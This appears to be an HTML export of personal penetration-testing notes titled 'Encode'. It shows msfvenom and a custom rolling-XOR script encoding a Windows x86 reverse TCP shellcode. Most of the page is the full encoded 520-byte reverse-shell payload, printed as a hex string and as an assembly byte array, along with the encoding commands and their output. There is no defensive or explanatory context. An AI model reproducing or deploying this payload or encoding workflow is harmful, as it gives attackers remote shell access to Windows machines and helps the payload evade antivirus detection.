<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Encode</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Encode</h1><br/><strong>Encode MSF</strong><br />$ cat win_x86_rev_tcp_dynamic-addresses_EDB-BASED_ID-40334.bin | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -f raw -o encoded_revshell.bin -<br />Attempting to read payload from STDIN...<br />Found 1 compatible encoders<br />Attempting to encode payload with 1 iterations of x86/call4_dword_xor<br />x86/call4_dword_xor succeeded with size 520 (iteration=0)<br />x86/call4_dword_xor chosen with final size 520<br />Payload size: 520 bytes<br />Saved as: encoded_revshell.bin<br /><br /><strong>Encode XOR</strong><br />$ python rolling-xor-encoder-random.py encoded_revshell.bin <br />[*] Encoding shellcode ...<br />Bad random number: 25 "\x19" on shellcode character "\x51" for bad character \x0a: XORRED result is \x10<br />Bad random number: 218 "\xda" on shellcode character "\x43" for bad character \x00: XORRED result is \x00<br />Bad random number: 28 "\x1c" on shellcode character "\x84" for bad character \x0a: XORRED result is \x10<br /><br />...<br /><br />Bad random number: 211 "\xd3" on shellcode character "\x86" for bad character \x00: XORRED result is \x00<br /><br />Good random number: 46<br /><br />[*] Hex shellcode<br />"\x2e\x1f\xd6\x55\xbc\x38\xd0\x2f\xd0\x2f\xd0\x10\x4e\xcf\xb9\xb7\xf4\xb5\x02\xb3\x30\xde\x22\xc0\x34\x46\xce\x1d\x27\x25\x54\x68\x99\xd6\x1c\xdb\x7e\x90\x47\x5d\x67\x6c\x3d\x01\xe9\x96\xd6\xaa\x90\x88\xb1\x07\x7d\xb5\x87\x10\xa0\x2d\x5d\x38\xcb\x25\x65\x1a\x2a\x51\x57\x85\x40\x53\x67\x24\x14\x2f\x6a\xaf\x71\x51\x51\x93\xc9\x0b\x32\x8d\x58\x7f\x4c\x9e\x5a\xfb\x31\xf5\x58\x1a\x95\xa9\x0c\xd9\x99\xe4\x64\xe7\xf6\xc2\x9f\xc4\x08\x8b\x1e\xd4\x83\xbd\xc3\xe8\xda\x2c\xdf\xde\xf9\xc7\x32\x55\x16\xc9\x17\x37\x13\xd7\x0e\x39\x1d\xfa\x39\x12\x10\xd5\x01\x23\xef\x5c\xc9\xda\xca\x82\xe1\x21\xa4\x03\x3b\x3e\x7b\xfd\x85\xae\x8a\x4e\x8c\x8e\x47\xbc\x29\x69\x40\xa7\x64\x48\x6a\xb5\x41\x7a\x52\x91\xad\xe2\x87\x61\x87\x3b\x6c\x58\x2d\x62\xaa\x5b\xe2\x90\x18\xfe\x27\x05\x36\xf8\x08\x23\x2e\xf0\x23\x12\x3b\xc0\x1e\x3c\x19\x23\x9e\xf9\xe9\x09\x47\x12\xd0\xa3\x1e\x6c\xe4\x3b\xe6\xc9\xc9\x3f\xe8\x22\x2f\xbc\x0f\x24\x56\xd3\x4c\x6b\x42\x82\x40\x31\x2f\x15\xa8\xcf\xdf\x97\xf6\x36\xb3\x0c\x34\xb0\xc0\xbe\x67\x51\x60\x96\x66\x43\x8b\x70\xe5\xa4\x8d\x4e\x9e\xaf\x9a\x45\xa3\xb3\xb3\x57\x6b\x24\x41\xa7\x46\xfa\xad\x99\xec\xa3\x6b\x9a\x27\x55\xdd\x02\xc7\xc5\xc6\x33\xe4\x2e\x23\xb0\x03\x28\x06\xd2\x08\x2e\x07\xe7\x05\x07\x15\x2f\x92\xf5\xe5\x05\x4b\x1e\xdc\xaf\x12\xd8\xdf\x78\xf8\x72\x5b\x8f\x4a\x48\x48\x99\xa1\xae\xcb\x7e\xa7\x8b\xa4\x7d\xa9\x82\x94\x70\x80\x80\x4c\xf7\x62\x70\x66\x2e\x89\x49\xcc\x77\x4f\x4a\x1f\x99\xe1\xf3\xd4\xda\xfb\xb9\xd1\xaa\x96\xd9\xbc\x3a\x50\x75\x8f\x3a\x89\x9b\x89\xc1\x26\x69\x19\x67\x87\x95\x85\x83\x34\x26\xe4\xba\x0e\x1c\x1c\xfa\xb4\xa1\xf0\xd0\x50\xda\xca\x2c\xcc\xde\x59\xea\x7f\x3e\x19\x69\x9c\xfb\xb8\x14\x9c\x18\x1d\x8e\x3b\xb8\x51\x1a\xa5\xd7\x5f\x65\xc8\xaf\xbf\x59\xb9\xab\x5b\xfc\x1c\x0c\x1a\x52\xb5\xe2\x92\xec\x64\xef\xdb\x85\x05\x8f\x4d\x16\xb7\x79\x2c\xbf\x59\x4d\x5b\xbd\x6a\x78\x5f\xb9\xb9\x05\x05\xe3\x63\xe9\xf9\x1f\xff\xed\xfd\x1b\xfb\xe9\xf9\x1f\x1f\x18\x08\x32\x8f\xe8\x98\xfd\x24\x02\x3b\xe9\x19\xd2\xc7\x54\xe6\xcd\xef\x35\xe0\x8d\x41\xe2\x77\x67\x77\xf1\x89\x9b\x8b\x6d\x9d\x8f\xff\x81\x61\x73\x60\x86\xc8\xdd\x98\x7f\x31\x24\x6d\xda\x6b"<br /><br />[*] ASM shellcode<br />EncodedShellcode: db 0x2e,0x1f,0xd6,0x55,0xbc,0x38,0xd0,0x2f,0xd0,0x2f,0xd0,0x10,0x4e,0xcf,0xb9,0xb7,0xf4,0xb5,0x02,0xb3,0x30,0xde,0x22,0xc0,0x34,0x46,0xce,0x1d,0x27,0x25,0x54,0x68,0x99,0xd6,0x1c,0xdb,0x7e,0x90,0x47,0x5d,0x67,0x6c,0x3d,0x01,0xe9,0x96,0xd6,0xaa,0x90,0x88,0xb1,0x07,0x7d,0xb5,0x87,0x10,0xa0,0x2d,0x5d,0x38,0xcb,0x25,0x65,0x1a,0x2a,0x51,0x57,0x85,0x40,0x53,0x67,0x24,0x14,0x2f,0x6a,0xaf,0x71,0x51,0x51,0x93,0xc9,0x0b,0x32,0x8d,0x58,0x7f,0x4c,0x9e,0x5a,0xfb,0x31,0xf5,0x58,0x1a,0x95,0xa9,0x0c,0xd9,0x99,0xe4,0x64,0xe7,0xf6,0xc2,0x9f,0xc4,0x08,0x8b,0x1e,0xd4,0x83,0xbd,0xc3,0xe8,0xda,0x2c,0xdf,0xde,0xf9,0xc7,0x32,0x55,0x16,0xc9,0x17,0x37,0x13,0xd7,0x0e,0x39,0x1d,0xfa,0x39,0x12,0x10,0xd5,0x01,0x23,0xef,0x5c,0xc9,0xda,0xca,0x82,0xe1,0x21,0xa4,0x03,0x3b,0x3e,0x7b,0xfd,0x85,0xae,0x8a,0x4e,0x8c,0x8e,0x47,0xbc,0x29,0x69,0x40,0xa7,0x64,0x48,0x6a,0xb5,0x41,0x7a,0x52,0x91,0xad,0xe2,0x87,0x61,0x87,0x3b,0x6c,0x58,0x2d,0x62,0xaa,0x5b,0xe2,0x90,0x18,0xfe,0x27,0x05,0x36,0xf8,0x08,0x23,0x2e,0xf0,0x23,0x12,0x3b,0xc0,0x1e,0x3c,0x19,0x23,0x9e,0xf9,0xe9,0x09,0x47,0x12,0xd0,0xa3,0x1e,0x6c,0xe4,0x3b,0xe6,0xc9,0xc9,0x3f,0xe8,0x22,0x2f,0xbc,0x0f,0x24,0x56,0xd3,0x4c,0x6b,0x42,0x82,0x40,0x31,0x2f,0x15,0xa8,0xcf,0xdf,0x97,0xf6,0x36,0xb3,0x0c,0x34,0xb0,0xc0,0xbe,0x67,0x51,0x60,0x96,0x66,0x43,0x8b,0x70,0xe5,0xa4,0x8d,0x4e,0x9e,0xaf,0x9a,0x45,0xa3,0xb3,0xb3,0x57,0x6b,0x24,0x41,0xa7,0x46,0xfa,0xad,0x99,0xec,0xa3,0x6b,0x9a,0x27,0x55,0xdd,0x02,0xc7,0xc5,0xc6,0x33,0xe4,0x2e,0x23,0xb0,0x03,0x28,0x06,0xd2,0x08,0x2e,0x07,0xe7,0x05,0x07,0x15,0x2f,0x92,0xf5,0xe5,0x05,0x4b,0x1e,0xdc,0xaf,0x12,0xd8,0xdf,0x78,0xf8,0x72,0x5b,0x8f,0x4a,0x48,0x48,0x99,0xa1,0xae,0xcb,0x7e,0xa7,0x8b,0xa4,0x7d,0xa9,0x82,0x94,0x70,0x80,0x80,0x4c,0xf7,0x62,0x70,0x66,0x2e,0x89,0x49,0xcc,0x77,0x4f,0x4a,0x1f,0x99,0xe1,0xf3,0xd4,0xda,0xfb,0xb9,0xd1,0xaa,0x96,0xd9,0xbc,0x3a,0x50,0x75,0x8f,0x3a,0x89,0x9b,0x89,0xc1,0x26,0x69,0x19,0x67,0x87,0x95,0x85,0x83,0x34,0x26,0xe4,0xba,0x0e,0x1c,0x1c,0xfa,0xb4,0xa1,0xf0,0xd0,0x50,0xda,0xca,0x2c,0xcc,0xde,0x59,0xea,0x7f,0x3e,0x19,0x69,0x9c,0xfb,0xb8,0x14,0x9c,0x18,0x1d,0x8e,0x3b,0xb8,0x51,0x1a,0xa5,0xd7,0x5f,0x65,0xc8,0xaf,0xbf,0x59,0xb9,0xab,0x5b,0xfc,0x1c,0x0c,0x1a,0x52,0xb5,0xe2,0x92,0xec,0x64,0xef,0xdb,0x85,0x05,0x8f,0x4d,0x16,0xb7,0x79,0x2c,0xbf,0x59,0x4d,0x5b,0xbd,0x6a,0x78,0x5f,0xb9,0xb9,0x05,0x05,0xe3,0x63,0xe9,0xf9,0x1f,0xff,0xed,0xfd,0x1b,0xfb,0xe9,0xf9,0x1f,0x1f,0x18,0x08,0x32,0x8f,0xe8,0x98,0xfd,0x24,0x02,0x3b,0xe9,0x19,0xd2,0xc7,0x54,0xe6,0xcd,0xef,0x35,0xe0,0x8d,0x41,0xe2,0x77,0x67,0x77,0xf1,0x89,0x9b,0x8b,0x6d,0x9d,0x8f,0xff,0x81,0x61,0x73,0x60,0x86,0xc8,0xdd,0x98,0x7f,0x31,0x24,0x6d,0xda,0x6b<br /><br />[*] Length: 520<br /></div></body></html>